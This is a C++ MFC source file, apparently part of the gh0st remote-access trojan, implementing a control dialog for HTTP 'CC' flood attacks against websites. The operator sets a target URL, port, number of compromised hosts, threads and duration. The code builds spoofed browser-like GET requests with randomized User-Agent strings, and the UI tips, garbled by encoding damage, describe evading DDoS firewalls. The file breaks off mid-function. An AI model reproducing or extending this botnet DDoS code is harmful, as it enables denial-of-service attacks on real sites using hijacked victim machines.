// WebAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "WebAttackDlg.h"
#include "DDOSAttackDlg.h"
#include "gh0stView.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg dialog


CWebAttackDlg::CWebAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWebAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebAttackDlg)
		// NOTE: the ClassWizard will add member initialization here
	m_NewAuto = FALSE;
	m_SelectHost = FALSE;
	m_HostNums = 200;
	m_EndVar = 1000;
	m_Port = 80;
	m_AttckTims = 60;
	m_StartVar = 1;
	m_TargetWeb = _T("http://www.baidu.com");
	m_ThreadNums = 10;
	m_TipShow = _T("");
	//}}AFX_DATA_INIT
	TaskID = 0;
	Point = NULL;
	ViewPoint = NULL;

}


void CWebAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebAttackDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_TARGET_WEB, m_TargetCtrl);
	DDX_Control(pDX, IDC_SLIDER_TIME, m_TimeCtrl);
	DDX_Control(pDX, IDC_SLIDER_THREAD, m_ThreadCtrl);
	DDX_Control(pDX, IDC_SPIN_NUM, m_HotsNumCtrl);
	DDX_Control(pDX, IDC_COMBO_MODEL, m_ModelList);
	DDX_Control(pDX, IDC_LIST_TARGET, m_TargetList);
	DDX_Check(pDX, IDC_NEWAUTO, m_NewAuto);
	DDX_Check(pDX, IDC_SELECTHOST, m_SelectHost);
	DDX_Text(pDX, IDC_HOSTNUMS, m_HostNums);
	DDV_MinMaxUInt(pDX, m_HostNums, 1, 20000);
	DDX_Text(pDX, IDC_ENDVAR, m_EndVar);
	DDV_MinMaxUInt(pDX, m_EndVar, 2, 100000);
	DDX_Text(pDX, IDC_ATTCKPORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Text(pDX, IDC_ATTACKTIMES, m_AttckTims);
	DDX_Text(pDX, IDC_STARTVAR, m_StartVar);
	DDV_MinMaxUInt(pDX, m_StartVar, 1, 100000);
	DDX_Text(pDX, IDC_TARGET_WEB, m_TargetWeb);
	DDV_MaxChars(pDX, m_TargetWeb, 300);
	DDX_Text(pDX, IDC_THREADNUMS, m_ThreadNums);
	DDV_MinMaxDWord(pDX, m_ThreadNums, 1, 100);
	DDX_Text(pDX, IDC_STATIC_TIP, m_TipShow);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CWebAttackDlg)
	ON_BN_CLICKED(IDC_ADDTASK, OnAddtask)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_TIME, OnCustomdrawSliderTime)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_THREAD, OnCustomdrawSliderThread)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_TARGET, OnRclickListTarget)
	ON_WM_CTLCOLOR()
	ON_CBN_SELCHANGE(IDC_COMBO_MODEL, OnSelchangeComboModel)
	ON_EN_CHANGE(IDC_TARGET_WEB, OnChangeTargetWeb)
	ON_EN_SETFOCUS(IDC_STARTVAR, OnSetfocusStartvar)
	ON_EN_SETFOCUS(IDC_TARGET_WEB, OnSetfocusTargetWeb)
	ON_CBN_SETFOCUS(IDC_COMBO_MODEL, OnSetfocusComboModel)
	ON_EN_SETFOCUS(IDC_THREADNUMS, OnSetfocusThreadnums)
	ON_EN_CHANGE(IDC_THREADNUMS, OnChangeThreadnums)
	ON_EN_CHANGE(IDC_ATTACKTIMES, OnChangeAttacktimes)
	ON_EN_SETFOCUS(IDC_ATTACKTIMES, OnSetfocusAttacktimes)
	ON_EN_CHANGE(IDC_ATTCKPORT, OnChangeAttckport)
	ON_EN_SETFOCUS(IDC_ATTCKPORT, OnSetfocusAttckport)
	ON_EN_CHANGE(IDC_HOSTNUMS, OnChangeHostnums)
	ON_EN_SETFOCUS(IDC_HOSTNUMS, OnSetfocusHostnums)
	ON_EN_CHANGE(IDC_STARTVAR, OnChangeStartvar)
	ON_EN_CHANGE(IDC_ENDVAR, OnChangeEndvar)
	ON_EN_SETFOCUS(IDC_ENDVAR, OnSetfocusEndvar)
	ON_BN_CLICKED(IDC_SELECTHOST, OnSelecthost)
	ON_BN_CLICKED(IDC_NEWAUTO, OnNewauto)
	ON_WM_SIZE()
	ON_COMMAND(IDM_START, OnStart)
	ON_COMMAND(IDM_STOP, OnStop)
	ON_COMMAND(IDM_DELETE_LIST, OnDeleteList)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

BEGIN_EASYSIZE_MAP(CWebAttackDlg)
//EASYSIZE(control,left,top,right,bottom,options)
//ES_BORDER��ʾ�ؼ���Ի���߽磨���¼�Ʊ߽磩�ľ��룻
//ES_KEEPSIZE��ʾ�ؼ�ˮƽ/��ֱ�����ϳߴ籣�ֲ��䣻
//�ؼ�IDֵ��ʾ��ǰ�ؼ���ָ���ؼ�֮��ľ��룻
//ES_HCENTER��ʾ���ź�ؼ���ָ��λ����ˮƽ���У�
//ES_VCENTER��ʾ���ź�ؼ���ָ��λ���ڴ�ֱ���У�
EASYSIZE(IDC_STATIC_1,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_TIP,ES_BORDER,ES_KEEPSIZE,ES_BORDER,ES_BORDER,0) 
EASYSIZE(IDC_LIST_TARGET,ES_BORDER,ES_BORDER,ES_BORDER,ES_BORDER,0)
EASYSIZE(IDC_TARGET_WEB,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_COMBO_MODEL,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ATTCKPORT,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_HOSTNUMS,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SPIN_NUM,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_6,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_7,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_8,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SLIDER_THREAD,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SLIDER_TIME,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SELECTHOST,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_NEWAUTO,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_THREADNUMS,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ATTACKTIMES,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_9,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_10,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_11,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STARTVAR,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ENDVAR,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ADDTASK,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
END_EASYSIZE_MAP

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg message handlers

WORD CWebAttackDlg::GetPortNum(LPSTR szUrl,WORD iPort,LPSTR URL)
{
	//http://www.baidu.com/index.php

	CString Str=szUrl;
	Str.MakeLower();
	strcpy(szUrl,Str.GetBuffer(0));


	CHAR *Test = strstr(szUrl,".gov");
	if(Test != NULL)
		return 0;

    CHAR *Point = strstr(szUrl,"http://");
	
	if(Point!=NULL)
		Point+=7;
	else
		Point =szUrl;

	CHAR *Temp = strstr(Point,":");

	CHAR TempBuffer[400]={NULL};
	
	//�����ַ�������˿� ����iPort ������80 ����URL��ַ��Ӷ˿�.
	if(Temp == NULL)
	{
		if(iPort!=80)
		{
			Test = strstr(Point,"/");
			if(Test==NULL)
				wsprintf(URL,"http://%s:%u",Point,iPort);
			else
			{
				strncpy(TempBuffer,Point,strlen(Point)-strlen(Test));
				wsprintf(URL,"http://%s:%u%s",TempBuffer,iPort,Test);
			}

		}
		else
			 wsprintf(URL,"http://%s",Point);
		return iPort;
	}
	else//�����ַ�����˿� �򷵻ص�ַ�еĶ˿�! ����iPort ����.
	{
		Test = strstr(Point,"/");
		wsprintf(URL,"http://%s",Point);
		return atoi(++Temp);
	}	
}

WORD CWebAttackDlg::ForMatFlowAddr(LPSTR szAddr,WORD iPort)
{
		CHAR *Point = strstr(szAddr,"http://");
		if(Point)
			Point+=7;
		else
			Point = szAddr;
		
		CHAR Addr[400]={NULL};
		strcpy(Addr,Point);
		
		Point = Addr;
		CHAR *Temp = strstr(Addr,"/");
		if(Temp)
			*Temp ='\0';
		
		CHAR *Port=strstr(Point,":");
		
		if(Port)
		{
			*Port='\0';
			Port++;
			strcpy(szAddr,Addr);
			return atoi(Port);
		}
		
		strcpy(szAddr,Addr);
		return iPort;
}


void CWebAttackDlg::OnAddtask() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	//���˵�һЩ������ַ�....
	if(m_Port<0 || m_Port >65535)
	{
		MessageBox("�˿ڴ���!");
		return;
	}
	if(m_TargetWeb.GetLength()<=0 ||m_TargetWeb.GetLength()>400)
	{
		MessageBox("Ŀ�����!");
		return;
	}
	//����ֱ�ӰѲ������˵�...
	CString Temp;

    GetDlgItemText(IDC_COMBO_MODEL,Temp);
	if(Temp =="��վ: �ֻ�CC")
	{
		if(m_TargetWeb.Find("%d")==-1)
		{
			MessageBox("�ֻ�CCĿ���ַ������� %d ͨ���!","���ʧ��!");
			return;
		}
	}

	if(Temp =="��վ: ����CC" || Temp =="��վ: ģ�� IE" || Temp =="��վ: �ֻ�CC")
	{
		CHAR TempStr[400]={NULL};
		WORD iPort=GetPortNum(m_TargetWeb.GetBuffer(0),m_Port,TempStr);
		if(iPort==0)
		{
			MessageBox("��ַ�������Ϸ���Ϣ!");
			return;
		}
		m_Port = iPort;
		m_TargetWeb.Format("%s",TempStr);
	}
	else
	{
		m_Port=ForMatFlowAddr(m_TargetWeb.GetBuffer(0),m_Port);
	}


	WORD iCount = m_TargetList.GetItemCount();

	m_TargetList.InsertItem(iCount,"",TRUE);
	
	m_TargetList.SetItemText(iCount,0,m_TargetWeb);
	
	Temp.Format("%d",m_Port);
	m_TargetList.SetItemText(iCount,1,Temp);

	
	//�������� ���ѡ������Ѿ�ѡ������
	if(m_SelectHost)
		Temp="ѡ������";
	else
		Temp.Format("%d",m_HostNums);
	m_TargetList.SetItemText(iCount,2,Temp);


	Temp.Format("%d",m_ThreadNums);
	m_TargetList.SetItemText(iCount,3,Temp);

	Temp.Format("%d",m_AttckTims);
	m_TargetList.SetItemText(iCount,4,Temp);

	GetDlgItemText(IDC_COMBO_MODEL,Temp);
	m_TargetList.SetItemText(iCount,5,Temp);

	if(Temp=="��վ: �ֻ�CC")
		Temp.Format("%d-%d",m_StartVar,m_EndVar);
	else
		Temp="��֧��";
	
	m_TargetList.SetItemText(iCount,6,Temp);

	Temp=(m_NewAuto)?"��":"��";

	m_TargetList.SetItemText(iCount,7,Temp);
	
	m_TargetList.SetItemText(iCount,8,"����");

	Temp.Format("%d",TaskID++);

	m_TargetList.SetItemText(iCount,9,Temp);

}



BOOL CWebAttackDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
		m_HotsNumCtrl.SetRange(1,20000);
	m_HotsNumCtrl.SetPos(200);
	m_HotsNumCtrl.SetBuddy(GetDlgItem(IDC_HOSTNUMS));

	m_TimeCtrl.SetRange(1,600);
	m_TimeCtrl.SetPos(60);

	m_ThreadCtrl.SetRange(1,100);
	m_ThreadCtrl.SetPos(10);

	LONG lStyle;
	lStyle = GetWindowLong(m_TargetList.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK; 
	lStyle |= LVS_REPORT;
	SetWindowLong(m_TargetList.m_hWnd,GWL_STYLE, lStyle);
	SetWindowLong(m_TargetList.m_hWnd, GWL_STYLE, lStyle);
	
	DWORD dwStyle = m_TargetList.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;
	dwStyle |= LVS_EX_GRIDLINES;
	
    m_TargetList.SetExtendedStyle(dwStyle); 


	m_TargetList.InsertColumn(0,"��ַ(Ŀ��)",LVCFMT_LEFT,140);
	m_TargetList.InsertColumn(1,"Ŀ��˿�",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(2,"��������",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(3,"�߳�����",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(4,"����ʱ��",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(5,"ģʽ",LVCFMT_LEFT,90);
	m_TargetList.InsertColumn(6,"�ֻ�CC����",LVCFMT_LEFT,78);
	m_TargetList.InsertColumn(7,"�������Զ�����",LVCFMT_LEFT,100);
	m_TargetList.InsertColumn(8,"״̬",LVCFMT_LEFT,60);
	m_TargetList.InsertColumn(9,"����ID",LVCFMT_LEFT,60);
	m_ModelList.SetCurSel(0);

	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);
	
	INIT_EASYSIZE;
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebAttackDlg::OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	m_AttckTims = m_TimeCtrl.GetPos();
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.";
	SetDlgItemInt(IDC_ATTACKTIMES,m_AttckTims);
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);

	*pResult = 0;
}

void CWebAttackDlg::OnChangeAttacktimes() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����!";
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttacktimes() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����";
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

VOID CWebAttackDlg::ShowThreads()
{	
	if(m_ThreadNums<=20)
		m_TipShow ="�߳�һ��,����CPUռ��20%����,���ռ��60%����,�����������������";
	if(m_ThreadNums>20&&m_ThreadNums<40)
		m_TipShow ="�̹߳���,����CPUռ��50%����,���ռ��80%����,���������������ľ�,���ҵ���";
	if(m_ThreadNums>40&&m_ThreadNums<100)
		m_TipShow ="�̹߳���,����CPUռ��80%����,����ľ�,�����޷�����ֹͣ����,���Ҽ��������������,����,�����鿼��!";
	
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}


void CWebAttackDlg::OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	m_ThreadNums = m_ThreadCtrl.GetPos();
	ShowThreads();
	SetDlgItemInt(IDC_THREADNUMS,m_ThreadNums);
	
	*pResult = 0;
}
void CWebAttackDlg::OnSetfocusThreadnums() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}

void CWebAttackDlg::OnChangeThreadnums() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}
void CWebAttackDlg::OnRclickListTarget(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu m_ListMenu;
	m_ListMenu.LoadMenu(IDR_MENU_REPORT);
	CPoint Point;
	GetCursorPos(&Point);

	CMenu *Temp=m_ListMenu.GetSubMenu(0);
	
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i,8);
		   if(str=="������")
		   {
			   Temp->EnableMenuItem(0, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
			   Temp->EnableMenuItem(2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		   }
		   else
		   {
			   Temp->EnableMenuItem(1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		   }
		}
	}
	
	Temp->TrackPopupMenu(TPM_LEFTBUTTON|TPM_RIGHTBUTTON,Point.x,Point.y,this,NULL);
	
	*pResult = 0;
}


HBRUSH CWebAttackDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_STATIC_TIP) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		CFont font;
		font.CreatePointFont(90,"����");
		pDC->SelectObject(&font);

		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CWebAttackDlg::OnSelchangeComboModel() 
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_MODEL,temp);

	if(temp=="��վ: ����CC")
	     m_TipShow="����CC ������Ч�Ĳ�����վ�Ĳ�����������,�Լ���̨���ݿ��������,�ܹ���Ч�Ĳ���WEB��վ���ܳ��ܵ�ѹ��!\r\n";
	if(temp =="��վ: ģ�� IE")
		m_TipShow="ģ��IEģʽ ����ȫģ��IE��������͵�HTTP����,����Cookie.�ܹ���Ч��ͻ�Ʋ���DDOS����ǽ!\r\n";
	
	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);

	if(temp =="��վ: �ֻ�CC")
	{
		m_TipShow="ĳЩҳ����һ���Ĺ��� ���� bbs.xxxx.com/%d.php �����%d �����ֻ�CC���� ������ʼΪ:1 ����Ϊ:10\r\n"
		"��ô�⼦����� bbs.xxxx.com/1.php һֱ���� bbs.xxxx.com/10.php һ������10��ҳ�� ��WEB��վ��������Ĺ���";
		GetDlgItem(IDC_STARTVAR)->EnableWindow(TRUE);
		GetDlgItem(IDC_ENDVAR)->EnableWindow(TRUE);
	}
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnSetfocusComboModel() 
{
	// TODO: Add your control notification handler code here
			CString temp ="��ȷ��ģʽ ��֢��ҩ ����С������ ��͵��߳� ���ӳ���������!";
	SetDlgItemText(IDC_STATIC_TIP,temp);
}

void CWebAttackDlg::OnChangeTargetWeb() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
		CString temp ="Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n"
		"���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!";
	SetDlgItemText(IDC_STATIC_TIP,temp);
	
}

void CWebAttackDlg::OnSetfocusTargetWeb() 
{
	// TODO: Add your control notification handler code here
		CString temp ="Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n"
		"���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!";
	SetDlgItemText(IDC_STATIC_TIP,temp);
}

void CWebAttackDlg::OnChangeAttckport() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="�˿�һ��Ҫ��ȷ,��ȷ�Ķ˿ڲ��ܸ�Ŀ�������Ĵ��!һ����վ�˿�Ϊ80";
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttckport() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="�˿�һ��Ҫ��ȷ,��ȷ�Ķ˿ڲ��ܸ�Ŀ�������Ĵ��!һ����վ�˿�Ϊ80";
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnChangeHostnums() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n"
		"ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.";
	
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnSetfocusHostnums() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n"
		"ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.";
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

VOID CWebAttackDlg::ShowPageNums()
{
	if(m_StartVar>=m_EndVar)
	{
		m_TipShow="��ʼ���� ���� �������� ����!";
		SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
		return;
	}

	if(m_TargetWeb.Find("%d")==-1)
	m_TipShow="Ŀ����� û���ҵ� %d ͨ���!!��������дĿ��!";
	else
	{
		CHAR Buffer[400]={NULL};
		ZeroMemory(Buffer,sizeof(Buffer));
		GetDlgItemText(IDC_TARGET_WEB,Buffer,sizeof(Buffer));
		
		CHAR *Point;
		Point = strstr(Buffer,"%d");
		if(Point==NULL)
			return;

		CHAR TempHead[300]={NULL};
		ZeroMemory(TempHead,sizeof(TempHead));
		
		strncpy(TempHead,Buffer,strlen(Buffer)-strlen(Point));
		//����%d...
		Point+=2;

		m_TipShow.Format("Ŀ����ȷ %s%d%s -- %s%d%s ����%d��ҳ��",
			TempHead,m_StartVar,Point,TempHead,m_EndVar,Point,(m_EndVar - m_StartVar)+1);
	}
	SetDlgItemText(IDC_STATIC_TIP,m_TipShow);
}

void CWebAttackDlg::OnSetfocusStartvar() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}
void CWebAttackDlg::OnSetfocusEndvar() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();	
}

void CWebAttackDlg::OnChangeStartvar() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}


void CWebAttackDlg::OnChangeEndvar() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();	
}

void CWebAttackDlg::OnSelecthost() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if(m_SelectHost)
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(TRUE);
	}
	
}

void CWebAttackDlg::OnNewauto() 
{
	// TODO: Add your control notification handler code here
	
}


void CWebAttackDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	UPDATE_EASYSIZE;
}

DWORD CreateRandNum(WORD Min=0,WORD Max=0)
{
   SYSTEMTIME st;
   GetLocalTime(&st);
   if(Min==0&&Max==0)
		return GetTickCount()+st.wMinute+st.wSecond;
   else
	    return (GetTickCount()+st.wMinute+st.wSecond)%((Max-Min)+1)+Min;
}


BOOL CWebAttackDlg::FilterCCString(LPSTR szUrl,ATTACK &m_Attack,WORD &rPort)
{	 
	 if(szUrl==NULL)
		 return FALSE;
	 if(strstr(szUrl,"gov"))
		 return FALSE;

	 //strlwr(szUrl);
	 CString szTemp=szUrl;
	 szTemp.MakeLower();
	 strcpy(szUrl,szTemp.GetBuffer(0));

	 //�鿴�Ƿ���http://
	 CHAR *Point = strstr(szUrl,"http://");
	 if(Point)
		 Point+=7;//����http://
	 else
		 Point =szUrl;

	 CHAR DNS[200]={NULL};

	 CHAR *Port = strstr(Point,":");
	 CHAR *Temp = NULL;
	 WORD iPort =80;
	 CHAR *Page ="";

	 if(Port)//˵����ַ�����˿� ����
	 {
		 strncpy(DNS,Point,strlen(Point)-strlen(Port));
		 //��ȡ�˿�
		 Port++;
		 Temp=strstr(Port,"/");
		 if(Temp==NULL)
		 {
			 if(strlen(Port)>5)
			 {
				 MessageBox("��ַ���� �޷�ʶ��!");
				 return FALSE;
			 }
			 else
				 iPort =atoi(Port);
		 }
		 else
		 {
			 CHAR strPort[6]={NULL};
			 strncpy(strPort,Port,strlen(Port)-strlen(Temp));
			 iPort = atoi(strPort);
			 //����ҳ��
			 Page = Port;
			 Page+=strlen(strPort);
			 Page++;
		 }
	 }
	 else//��ַδ�����˿�...
	 {
		Temp = strstr(Point,"/");
		if(Temp==NULL)//˵��ֱ����������...
		{
			strcpy(DNS,Point);
		}
		else
		{
			strncpy(DNS,Point,strlen(Point)-strlen(Temp));
			Temp++;
			Page = Temp;
		}
	 }

	strcpy(m_Attack.Target,DNS);

	if(iPort!=80)
		wsprintf(DNS,"%s:%u",DNS,iPort);

	//��������CC �����.
	CHAR SendBuffer[]=
	"GET /%s HTTP/1.1\r\n"
	"Accept: application/x-shockwave-flash, image/gif, "
	"image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, "
	"application/vnd.ms-powerpoint, application/msword, application/xaml+xml, "
	"application/x-ms-xbap, application/x-ms-application, application/QVOD, application/QVOD, */*\r\n"
	"Accept-Language: zh-cn\r\n"
	"Accept-Encoding: gzip, deflate\r\n"
	"User-Agent: Mozilla/4.0 (compatible; MSIE %u.0; Windows NT %u.1; SV1; .NET4.0C; .NET4.0E; TheWorld)\r\n"
	"Host: %s\r\n"
	"Connection: Keep-Alive\r\n"
	"\r\n"
	"\r\n";

	wsprintf(m_Attack.SendData,SendBuffer,Page,CreateRandNum(5,9),CreateRandNum(2,6),DNS);

	m_Attack.AttackPort =iPort;
	

	return TRUE;
}

void CWebAttackDlg::OnStart() 
{
	// TODO: Add your command handler code here
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
		   CString str = m_TargetList.GetItemText(i,8);
		   if(str=="������")
		   {
				MessageBox("���� Ŀ���Ѿ�������!","��ʾ",MB_OK|MB_ICONINFORMATION);
				return;
		   }
		   else
		   {
				//��ȡ�����ṹ��...
				ATTACK m_Attack;
				ZeroMemory(&m_Attack,sizeof(ATTACK));
				//��ȡĿ��
				m_TargetList.GetItemText(i,0,m_Attack.Target,sizeof(m_Attack.Target));
			
